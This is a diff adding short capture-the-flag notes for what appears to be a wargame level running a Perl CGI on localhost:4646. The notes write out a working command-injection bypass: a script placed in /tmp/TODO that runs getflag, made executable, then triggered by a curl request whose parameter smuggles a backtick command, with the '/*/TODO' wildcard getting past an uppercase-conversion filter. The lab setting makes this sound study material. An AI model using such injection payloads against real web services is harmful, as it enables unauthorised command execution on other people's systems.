@@ -1,0 +1,6 @@
+- cat level12.pl -> up on localhost:4646/ so let’s curl
+- we can see a regex that only allows x with UPPERCASE 
+- echo "/bin/getflag > /tmp/flag" > /tmp/TODO
+- now tmp still in lowercase we can still execute `/*/TODO`
+- chmod 777 /tmp/TODO
+- curl http://localhost:4646/?x=\`\/*\/TODO\`
